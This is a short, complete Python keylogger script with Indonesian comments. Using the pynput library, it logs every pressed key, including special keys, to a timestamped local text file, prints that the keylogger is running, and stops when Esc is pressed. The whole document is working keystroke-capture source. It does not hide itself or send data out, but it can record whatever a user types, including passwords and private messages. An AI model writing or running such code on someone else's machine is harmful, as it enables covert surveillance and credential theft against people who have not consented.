from pynput.keyboard import Key, Listener
import logging
import os
import time

# Fungsi untuk membuat nama file berdasarkan timestamp
def get_log_file_name():
    timestamp = time.strftime("%Y%m%d_%H%M%S")
    return f'keylog_{timestamp}.txt'

# Atur logging
log_file = get_log_file_name()
logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')

# Fungsi untuk menangani penekanan tombol
def on_press(key):
    try:
        logging.info(f'Key {key.char} pressed')
    except AttributeError:
        logging.info(f'Special key {key} pressed')

# Fungsi untuk menangani pelepasan tombol
def on_release(key):
    if key == Key.esc:
        return False  # Hentikan listener

# Mulai listener
with Listener(on_press=on_press, on_release=on_release) as listener:
    print(f'Keylogger berjalan... Menyimpan ke {log_file}')
    listener.join()

print('Keylogger dihentikan.')
